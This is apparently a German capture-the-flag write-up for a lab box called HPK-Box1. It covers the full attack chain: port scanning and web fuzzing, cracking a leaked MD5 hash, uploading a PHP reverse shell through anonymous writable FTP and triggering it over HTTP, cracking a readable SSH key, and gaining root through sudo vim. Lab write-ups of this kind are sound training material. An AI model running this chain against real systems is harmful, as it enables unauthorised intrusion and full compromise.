| Platform   | HPK-Box1 |
| ---------- | -------- |
| Difficulty | TBA      |
| Start Date | 22.12.24 |
| Total Time | 32:04    |
| Keywords   | B2R      |

# Reconnaissance
Im ersten Schritt habe ich die IP-Adresse zu /etc/hosts hinzugefügt, damit ich diese nicht jedes mal eintippen muss.
### Scans
#### Basic Nmap Scan
Um zu schauen welche Services auf dem Target laufen, führen wir einen Nmap TCP-SYN Scan von allen Ports durch.
```
$ nmap -p- -vvv -T4 -Pn -sS -oN tcp_all hpkbox1
...
PORT      STATE SERVICE  REASON
22/tcp    open  ssh      syn-ack ttl 64
80/tcp    open  http     syn-ack ttl 64
33333/tcp open  dgi-serv syn-ack ttl 64
...
```
3 offene TCP-Ports: 
*  22 (wahrscheinlich ssh)
*  80 (wahrscheinlich http)
*  33333
#### Specific Nmap Scan
Um mehr Informationen über diese Ports zu bekommen, machen wir einen Nmap TCP-SYN scan mit Default Scripts und Banner Grabbing.
```
$ nmap -p20,80,33333 -vvv -T4 -Pn -sSCV -oN tcp_more hpkbox1
...
33333/tcp open   ftp      syn-ack ttl 64 vsftpd 3.0.5
...
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 ftp      ftp          4096 Nov 29  2023 ftp_uploads [NSE: writeable]
...
```
Port 22 und 80 sind wie angenommen SSH und HTTP. Der ungewöhnliche Port 33333 ist ein FTP Server mit Anonymous Login enabled.
 
#### Fuzz HTTP
Um nicht verlinkte Directories und Files auf dem HTTP Server zu finden, fuzzen wir nun mit einer kleinen Wordlist mit gewöhnlichen Verzeichnisnamen.
```
$ ffuf -u http://hpkbox1/FUZZ -w common.txt -c
...
login1                  [Status: 401, Size: 454, Words: 42, Lines: 15, Duration: 0ms]
...
```
Unter http://hpkbox1/login1 finden wir eine HTTP Login Form.
![alt text](screenshots/screenshot2.png "login1")
### Enumeration
Schauen wir uns zunächst den Source Code der Startseite an.
```
§ view-source:http://hpkbox1/
...
<!-- Hey zeri, since you seem to forget your password to our secret page all the time, i decided (against my better judgement) to leave a MD5 hash of it here: 775db752f52c97925e791f5e2a9ea3ad -->
$ echo "775db752f52c97925e791f5e2a9ea3ad" > zerihash
```
Wir finden einen Username und einen Hash. Während wir weitersuchen kann im Hintergrund der Hash gecracked werden. Dafür verwenden wir "John the Ripper" mit der rockyou.txt.
```
$ john -w=rockyou.txt --format=raw-md5 zerihash
...
12beme2008
...
```
Unser Nmap Scan hat verraten, dass sich via Anonymous Login mit dem FTP Server verbunden werden kann.
```
$ ftp Anonymous@hpkbox1 -p 33333
$ ls -la
-rw-r--r--    1 ftp      ftp            99 Nov 08  2023 .htaccess
drwxrwxrwx    2 ftp      ftp          4096 Nov 29  2023 ftp_uploads
$ ls -la ftp_uploads
$ get .htaccess
$ cat .htaccess
AuthType Basic
AuthName "Restricted Access"
AuthUserFile /etc/apache2/.htpasswd
Require valid-user

=> a upload folder (LFI?)
=> dont know what htaccess does, but normally we dont have access to that
```
Auf dem FTP server befindet sich eine .htaccess Datei. Damit kann ich nichts anfangen doch diese sollte normalerweise nicht einsehbar sein. Außerdem ist ein Directory "ftp_uploads" sichtbar. Vielleicht ist eine LFI möglich. Probieren wir dafür den Login auf dem HTTP Server mit unseren gefunden Credentials aus.
```
§ http://hpkbox1/login1/
Username: zeri
Password: 12beme2008
...
ftp_uploads
...
```
Nach erfolgreichem Login ist wieder "ftp_uploads" sichtbar.
![alt text](screenshots/screenshot3.png "ftp_uploads")
### Interesting Finds
* ftp_uploads
	* writeable via FTP
	* executable via HTTP
* user: zeri
* hash: 775db752f52c97925e791f5e2a9ea3ad (12beme2008)
# Exploitation
Als nächstes generieren wir eine ReverseShell mit revshells.com. Diese wird dann via FTP in das "ftp_uploads" Verzeichnis hochgeladen. Dann öffnen wir mit NetCat einen Listener und führen mit HTTP die ReverseShell aus.
```
$ nano ape.php
$ ftp Anonymous@hpk-box1 -p 33333
ftp> cd ftp_uploads
ftp> put ape.php
$ nc -lnvp 9001
§ http://hpkbox1/login1/ftp_uploads/ape.php 
www-data@hpk-box1:/$
```
Wir haben nun einen Initial Foothold. Als nächstes stabilisieren wir die ReverseShell um ein vollständiges TTY zu haben.
```
$ which python
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
$ stty raw -echo;fg
www-data@hpk-box1:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
# Privilege Escalation
Schauen wir zunächst in das "home" Verzeichnis
```
$ cd /home; ls
zeri
$ cd zeri; ls -la
-rwxr-xr-x 1 zeri zeri  220 Jan  6  2022 .bash_logout
-rwxr-xr-x 1 zeri zeri 3771 Jan  6  2022 .bashrc
-rwxr-xr-x 1 zeri zeri  807 Jan  6  2022 .profile
drwxr-xr-x 2 zeri zeri 4096 Nov 29  2023 .ssh
-rwxr-xr-x 1 zeri zeri   38 Nov  8  2023 user.txt
$ cat user.txt
HPK{4752aabac6ca5640350010dec30769e7}
```
Es gibt ein Unterverzeichnis für den User "zeri". Dort finden wir die user.txt und ein .ssh Verzeichnis.
```
$ cd .ssh; ls -la ...
-rwxr-xr-x 1 root root 567 Nov 29 2023 authorized_keys 
-rwxr-xr-x 1 zeri zeri 2655 Nov 29 2023 id_rsa
-rwxr-xr-x 1 zeri zeri 567 Nov 29 2023 id_rsa.pub
```
Der Private Key ist readable. Das sollte nicht sein. Im Hintergrund kann nun der Hash mit "John the Ripper" gecracked werden. Zunächst wird der Hash auf den Localhost kopiert, mit "ssh2john" in ein für John verständliches Format gebracht und dann mit der rockyou.txt ausgeführt.
```
$ cat id_rsa
localhost$ echo "..." > zeri_rsa
localhost$ ssh2john zeri_rsa > zeri_rsa.john
localhost$ john -w=rockyou.txt zeri_rsa.john
...
ILOVEYOU
...
```
Mit dem neuen Password können wir uns nun über SSH einloggen. Wichtig ist die Privileges auf dem Private Key anzupassen.
```
localhost$ chmod 600 zeri_rsa
localhost$ ssh zeri@hpkbox1 -i zeri_rsa
zeri@hpk-box1:~$ 
```
***
Die erste Vertical Privilege Escalation ist erfolgreich. Da wir nun ein Password haben überprüfen wir zunächst die sudo Konfiguration.
```
$ sudo -l
...
User zeri may run the following commands on hpk-box1:
    (ALL) NOPASSWD: /usr/bin/vim
```
Wir können vim mit Root Privileges ausführen. Das ist ein eindeutiger Attack Vector. Den genauen Exploit finden wir auf gtfobins.github.io
```
$ sudo vim -c ':!/bin/sh'
\# whoami
root
\# cat /root/root.txt
HPK{8ac3e605a7560dd62a1480cd983d28b2}
```
Der Privilege Escalation ist erfolreich und wir haben Root Privileges. Jetzt könne wir die root.txt einsehen und sind ferig.
# Learnings
always brute force :D
